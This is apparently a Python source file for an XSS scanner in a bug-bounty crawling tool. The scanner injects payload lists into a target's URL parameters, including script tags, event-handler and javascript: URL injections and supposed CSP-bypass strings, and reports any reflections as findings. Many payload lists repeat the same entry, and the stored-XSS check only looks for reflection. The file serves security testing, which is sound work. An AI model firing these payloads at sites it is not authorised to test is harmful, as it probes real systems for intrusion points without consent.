"""Cross-Site Scripting (XSS) scanner for BugBountyCrawler."""

import re
import asyncio
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode
import aiohttp

from .base import BaseScanner, ScanResult
from ..models.finding import Finding, FindingSeverity, FindingType


class XSSScanner(BaseScanner):
    """Scanner for Cross-Site Scripting (XSS) vulnerabilities."""
    
    def __init__(self, settings, rate_limiter=None):
        """Initialize XSS scanner."""
        super().__init__(settings, rate_limiter)
        self.name = "XSSScanner"
        
        # XSS payloads for different contexts
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(\"XSS\")</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(`XSS`)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
        ]
        
        # Context-aware payloads
        self.context_payloads = {
            'html': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<iframe src=data:text/html,<script>alert('XSS')</script>>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
            ],
            'attribute': [
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "\"><img src=x onerror=alert('XSS')>",
                "'><img src=x onerror=alert('XSS')>",
                "\" onmouseover=alert('XSS') x=\"",
                "' onmouseover=alert('XSS') x='",
                "\" onfocus=alert('XSS') autofocus=\"",
                "' onfocus=alert('XSS') autofocus='",
                "\" onerror=alert('XSS') src=x \"",
                "' onerror=alert('XSS') src=x '",
            ],
            'javascript': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "';alert('XSS');/*",
                "\";alert('XSS');/*",
                "';alert('XSS')//",
                "\";alert('XSS')//",
                "';alert('XSS')/*",
                "\";alert('XSS')/*",
                "';alert('XSS')",
                "\";alert('XSS')",
                "';alert('XSS');",
                "\";alert('XSS');",
                "';alert('XSS')/*",
                "\";alert('XSS')/*",
                "';alert('XSS')//",
                "\";alert('XSS')//",
            ],
            'url': [
                "javascript:alert('XSS')",
                "javascript:alert(\"XSS\")",
                "javascript:alert('XSS')",
                "javascript:alert(`XSS`)",
                "javascript:alert(String.fromCharCode(88,83,83))",
                "javascript:alert(/XSS/)",
                "javascript:alert('XSS')",
                "javascript:alert('XSS')",
                "javascript:alert('XSS')",
                "javascript:alert('XSS')",
            ],
            'css': [
                "expression(alert('XSS'))",
                "expression(alert(\"XSS\"))",
                "expression(alert('XSS'))",
                "expression(alert('XSS'))",
                "expression(alert('XSS'))",
                "expression(alert('XSS'))",
                "expression(alert('XSS'))",
                "expression(alert('XSS'))",
                "expression(alert('XSS'))",
                "expression(alert('XSS'))",
            ],
            'filter_bypass': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/)</script>",
                "<script>alert('XSS')</script>",
                "<script>alert('XSS')</script>",
                "<script>alert('XSS')</script>",
                "<script>alert('XSS')</script>",
                "<script>alert('XSS')</script>",
                "<script>alert('XSS')</script>",
                "<script>alert('XSS')</script>",
            ],
        }
        
        # DOM-based XSS patterns
        self.dom_patterns = [
            r'document\.write\s*\(',
            r'document\.writeln\s*\(',
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'insertAdjacentHTML\s*\(',
            r'eval\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
            r'Function\s*\(',
            r'location\s*=',
            r'location\.href\s*=',
            r'location\.search',
            r'location\.hash',
            r'document\.URL',
            r'document\.referrer',
            r'window\.name',
            r'history\.pushState',
            r'history\.replaceState',
        ]
        
        # CSP bypass payloads
        self.csp_bypass_payloads = [
            "<script nonce=''>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<form action=javascript:alert('XSS')><input type=submit>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
        ]
        
        # Detection patterns for reflected XSS
        self.reflection_patterns = [
            r'<script[^>]*>.*?alert\([\'"]XSS[\'"]\).*?</script>',
            r'<img[^>]*onerror[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<svg[^>]*onload[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<iframe[^>]*src[^>]*javascript:alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<body[^>]*onload[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<input[^>]*onfocus[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<select[^>]*onfocus[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<textarea[^>]*onfocus[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<keygen[^>]*onfocus[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<video[^>]*><source[^>]*onerror[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<audio[^>]*src[^>]*onerror[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<details[^>]*open[^>]*ontoggle[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<marquee[^>]*onstart[^>]*alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<object[^>]*data[^>]*javascript:alert\([\'"]XSS[\'"]\)[^>]*>',
            r'<embed[^>]*src[^>]*javascript:alert\([\'"]XSS[\'"]\)[^>]*>',
        ]
    
    async def scan_url(self, url: str) -> ScanResult:
        """Scan URL for XSS vulnerabilities."""
        findings = []
        errors = []
        response_time = 0.0
        status_code = 0
        headers = {}
        content_length = 0
        
        try:
            # Make baseline request
            baseline_response = await self.make_request(url)
            response_time = baseline_response.headers.get("X-Response-Time", 0.0)
            status_code = baseline_response.status
            headers = dict(baseline_response.headers)
            content_length = int(baseline_response.headers.get("Content-Length", 0))
            
            baseline_content = await baseline_response.text()
            
            # Parse URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if not query_params:
                # No parameters to test
                return ScanResult(
                    url=url,
                    findings=findings,
                    errors=errors,
                    response_time=response_time,
                    status_code=status_code,
                    headers=headers,
                    content_length=content_length
                )
            
            # Test each parameter for XSS
            for param_name, param_values in query_params.items():
                if param_values:
                    original_value = param_values[0]
                    
                    # Test reflected XSS
                    reflected_findings = await self._test_reflected_xss(
                        url, param_name, original_value, baseline_content
                    )
                    findings.extend(reflected_findings)
                    
                    # Test stored XSS (basic check)
                    stored_findings = await self._test_stored_xss(
                        url, param_name, original_value
                    )
                    findings.extend(stored_findings)
                    
                    # Test DOM-based XSS
                    dom_findings = await self._test_dom_xss(
                        url, param_name, original_value
                    )
                    findings.extend(dom_findings)
            
            # Test CSP bypass
            csp_findings = await self._test_csp_bypass(url, headers)
            findings.extend(csp_findings)
            
        except Exception as e:
            errors.append(str(e))
        
        return ScanResult(
            url=url,
            findings=findings,
            errors=errors,
            response_time=response_time,
            status_code=status_code,
            headers=headers,
            content_length=content_length
        )
    
    async def _test_reflected_xss(self, url: str, param_name: str, 
                                 original_value: str, baseline_content: str) -> List[Finding]:
        """Test for reflected XSS vulnerabilities."""
        findings = []
        
        # Test different contexts
        for context, payloads in self.context_payloads.items():
            for payload in payloads[:5]:  # Test first 5 payloads per context
                try:
                    # Create test URL with payload
                    test_url = self._create_test_url(url, param_name, payload)
                    
                    response = await self.make_request(test_url)
                    content = await response.text()
                    
                    # Check if payload is reflected in response
                    if self._is_payload_reflected(payload, content):
                        # Check for XSS patterns
                        for pattern in self.reflection_patterns:
                            if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                                finding = self.create_finding(
                                    url=url,
                                    finding_type=FindingType.XSS,
                                    title=f"Reflected XSS - {context.title()} Context (Parameter: {param_name})",
                                    description=f"Reflected XSS vulnerability detected in parameter '{param_name}' using {context} context payload: {payload}",
                                    severity=FindingSeverity.HIGH,
                                    impact="Reflected XSS can lead to session hijacking, credential theft, and malicious code execution in user browsers",
                                    likelihood="high",
                                    risk_score=8.5,
                                    references=[
                                        "https://owasp.org/www-community/attacks/xss/",
                                        "https://cwe.mitre.org/data/definitions/79.html"
                                    ],
                                    raw_data={
                                        "parameter": param_name,
                                        "payload": payload,
                                        "context": context,
                                        "pattern": pattern,
                                        "response_content": content[:500] if len(content) > 500 else content,
                                        "xss_type": "reflected"
                                    }
                                )
                                findings.append(finding)
                                break  # Found vulnerability, no need to test more patterns
                    
                    # Small delay to avoid overwhelming the server
                    await asyncio.sleep(0.1)
                    
                except Exception as e:
                    continue  # Skip failed tests
        
        return findings
    
    async def _test_stored_xss(self, url: str, param_name: str, 
                              original_value: str) -> List[Finding]:
        """Test for stored XSS vulnerabilities (basic check)."""
        findings = []
        
        # Test with a simple payload that would be stored
        test_payload = "<script>alert('STORED_XSS')</script>"
        
        try:
            # Create test URL with payload
            test_url = self._create_test_url(url, param_name, test_payload)
            
            # Make request to store the payload
            response = await self.make_request(test_url)
            content = await response.text()
            
            # Check if payload appears to be stored (appears in response)
            if test_payload in content:
                finding = self.create_finding(
                    url=url,
                    finding_type=FindingType.XSS,
                    title=f"Potential Stored XSS (Parameter: {param_name})",
                    description=f"Potential stored XSS vulnerability detected in parameter '{param_name}'. Payload appears to be stored: {test_payload}",
                    severity=FindingSeverity.HIGH,
                    impact="Stored XSS can lead to persistent attacks, session hijacking, and malicious code execution for all users",
                    likelihood="medium",
                    risk_score=8.0,
                    references=[
                        "https://owasp.org/www-community/attacks/xss/",
                        "https://cwe.mitre.org/data/definitions/79.html"
                    ],
                    raw_data={
                        "parameter": param_name,
                        "payload": test_payload,
                        "response_content": content[:500] if len(content) > 500 else content,
                        "xss_type": "stored"
                    }
                )
                findings.append(finding)
            
        except Exception as e:
            pass  # Skip failed tests
        
        return findings
    
    async def _test_dom_xss(self, url: str, param_name: str, 
                           original_value: str) -> List[Finding]:
        """Test for DOM-based XSS vulnerabilities."""
        findings = []
        
        try:
            # Get the page content to analyze for DOM patterns
            response = await self.make_request(url)
            content = await response.text()
            
            # Check for DOM-based XSS patterns
            for pattern in self.dom_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    # Check if the parameter is used in JavaScript context
                    if param_name in content:
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.XSS,
                            title=f"Potential DOM-based XSS (Parameter: {param_name})",
                            description=f"Potential DOM-based XSS vulnerability detected. Parameter '{param_name}' may be used in dangerous JavaScript context: {pattern}",
                            severity=FindingSeverity.HIGH,
                            impact="DOM-based XSS can lead to client-side code injection and malicious script execution",
                            likelihood="medium",
                            risk_score=7.5,
                            references=[
                                "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                                "https://cwe.mitre.org/data/definitions/79.html"
                            ],
                            raw_data={
                                "parameter": param_name,
                                "pattern": pattern,
                                "response_content": content[:500] if len(content) > 500 else content,
                                "xss_type": "dom_based"
                            }
                        )
                        findings.append(finding)
                        break  # Found potential vulnerability
            
        except Exception as e:
            pass  # Skip failed tests
        
        return findings
    
    async def _test_csp_bypass(self, url: str, headers: Dict[str, str]) -> List[Finding]:
        """Test for CSP bypass vulnerabilities."""
        findings = []
        
        # Check if CSP header is present
        csp_header = headers.get('Content-Security-Policy', '')
        
        if not csp_header:
            # No CSP header - this is a finding itself
            finding = self.create_finding(
                url=url,
                finding_type=FindingType.SECURITY_HEADERS,
                title="Missing Content Security Policy (CSP) Header",
                description="Content Security Policy header is missing, which may allow XSS attacks",
                severity=FindingSeverity.MEDIUM,
                impact="Missing CSP header reduces protection against XSS attacks",
                likelihood="high",
                risk_score=6.0,
                references=[
                    "https://owasp.org/www-community/controls/Content_Security_Policy",
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
                ],
                raw_data={
                    "header_name": "Content-Security-Policy",
                    "header_value": None,
                    "issue": "missing_csp"
                }
            )
            findings.append(finding)
        else:
            # Test CSP bypass payloads
            for payload in self.csp_bypass_payloads[:3]:  # Test first 3 payloads
                try:
                    # Create test URL with CSP bypass payload
                    test_url = self._create_test_url(url, "test", payload)
                    
                    response = await self.make_request(test_url)
                    content = await response.text()
                    
                    # Check if payload is reflected despite CSP
                    if self._is_payload_reflected(payload, content):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.XSS,
                            title="Potential CSP Bypass",
                            description=f"Potential CSP bypass detected using payload: {payload}",
                            severity=FindingSeverity.HIGH,
                            impact="CSP bypass can allow XSS attacks despite Content Security Policy",
                            likelihood="medium",
                            risk_score=7.0,
                            references=[
                                "https://owasp.org/www-community/controls/Content_Security_Policy",
                                "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
                            ],
                            raw_data={
                                "payload": payload,
                                "csp_header": csp_header,
                                "response_content": content[:500] if len(content) > 500 else content,
                                "xss_type": "csp_bypass"
                            }
                        )
                        findings.append(finding)
                        break  # Found potential bypass
                    
                    # Small delay to avoid overwhelming the server
                    await asyncio.sleep(0.1)
                    
                except Exception as e:
                    continue  # Skip failed tests
        
        return findings
    
    def _is_payload_reflected(self, payload: str, content: str) -> bool:
        """Check if payload is reflected in the response content."""
        # Simple check - payload appears in response
        return payload in content
    
    def _create_test_url(self, url: str, param_name: str, payload: str) -> str:
        """Create test URL with XSS payload."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Replace the parameter value with payload
        query_params[param_name] = [payload]
        
        # Rebuild URL
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if new_query:
            new_url += f"?{new_query}"
        
        return new_url
    
    def _extract_parameters_from_url(self, url: str) -> Dict[str, List[str]]:
        """Extract parameters from URL."""
        try:
            parsed = urlparse(url)
            return parse_qs(parsed.query)
        except Exception:
            return {}
    
    def _is_safe_parameter(self, param_name: str, param_value: str) -> bool:
        """Check if parameter is safe to test (avoid destructive operations)."""
        # Avoid testing certain parameters that might cause issues
        dangerous_params = ['password', 'passwd', 'pwd', 'secret', 'token', 'key']
        
        if param_name.lower() in dangerous_params:
            return False
        
        return True
